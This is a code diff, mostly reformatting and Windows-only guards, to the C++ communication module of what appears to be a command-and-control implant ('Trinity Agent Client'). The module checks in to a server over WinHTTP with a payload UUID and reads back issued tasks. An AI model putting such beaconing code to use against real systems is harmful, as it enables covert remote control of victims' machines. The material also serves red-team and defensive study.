@@ -4,20 +4,22 @@
 #include <iostream>
 #include <thread>
 #include <chrono>
+#ifdef _WIN32
 #include <windows.h>
 #include <winhttp.h>
 #pragma comment(lib, "winhttp.lib")
+#endif
 
 #ifndef PAYLOAD_UUID
-	#define PAYLOAD_UUID "d0e055ee-4290-4bbd-abff-71fbdfcc4058"
+#define PAYLOAD_UUID "d0e055ee-4290-4bbd-abff-71fbdfcc4058"
 #endif
 
 #ifndef HOST
-	#define HOST "localhost"
+#define HOST "localhost"
 #endif
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Default constructor 
+// Default constructor
 CommManager::CommManager()
 {
 	payloaddUUID = PAYLOAD_UUID;
@@ -25,15 +27,16 @@ CommManager::CommManager()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Intial checkin 
-void CommManager::IntialCheckin(const std::string& json)
+// Intial checkin
+void CommManager::IntialCheckin(const std::string &json)
 {
+#ifdef _WIN32
+	std::string result;
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
 	BOOL bResults = FALSE;
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
 	LPSTR pszOutBuffer = NULL;
-	std::string result;
 
 	hSession = WinHttpOpen(
 		L"Trinity Agent Client/1.0",
@@ -75,14 +78,16 @@ void CommManager::IntialCheckin(const std::string& json)
 	}
 	if (bResults)
 	{
-		do {
+		do
+		{
 			dwSize = 0;
 			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
 			{
 				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
 			}
 			// No Tasks have been issued
-			if (dwSize == 0) break;
+			if (dwSize == 0)
+				break;
 
 			pszOutBuffer = new char[dwSize + 1];
 			if (!pszOutBuffer)
@@ -107,21 +112,29 @@ void CommManager::IntialCheckin(const std::string& json)
 		callbackUUID = base64::from_base64(result);
 		delete[] pszOutBuffer;
 	}
-	if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
+	if (hRequest)
+		WinHttpCloseHandle(hRequest);
+	if (hConnect)
+		WinHttpCloseHandle(hConnect);
+	if (hSession)
+		WinHttpCloseHandle(hSession);
+#endif
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Full-established checkin 
-std::string CommManager::Checkin(const std::string& json)
+// Full-established checkin
+std::string CommManager::Checkin(const std::string &json)
 {
+#ifndef _WIN32
+	return "Checkin has only been implemented for Windows.";
+#endif
+
+	std::string result;
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
 	BOOL bResults = FALSE;
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
 	LPSTR pszOutBuffer = NULL;
-	std::string result;
 
 	hSession = WinHttpOpen(
 		L"Trinity Agent Client/1.0",
@@ -147,7 +160,7 @@ std::string CommManager::Checkin(const std::string& json)
 	{
 		data = callbackUUID;
 	}
-	else 
+	else
 	{
 		data = callbackUUID + json;
 	}
@@ -174,14 +187,16 @@ std::string CommManager::Checkin(const std::string& json)
 	}
 	if (bResults)
 	{
-		do {
+		do
+		{
 			dwSize = 0;
 			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
 			{
 				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
 			}
 			// No Tasks have been issued
-			if (dwSize == 0) break;
+			if (dwSize == 0)
+				break;
 
 			pszOutBuffer = new char[dwSize + 1];
 			if (!pszOutBuffer)
@@ -199,7 +214,7 @@ std::string CommManager::Checkin(const std::string& json)
 			{
 				std::cout << pszOutBuffer;
 			}
-			
+
 		} while (dwSize > 0);
 
 		if (pszOutBuffer != NULL)
@@ -209,9 +224,12 @@ std::string CommManager::Checkin(const std::string& json)
 
 		delete[] pszOutBuffer;
 	}
-	if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
+	if (hRequest)
+		WinHttpCloseHandle(hRequest);
+	if (hConnect)
+		WinHttpCloseHandle(hConnect);
+	if (hSession)
+		WinHttpCloseHandle(hSession);
 
 	return result;
 }
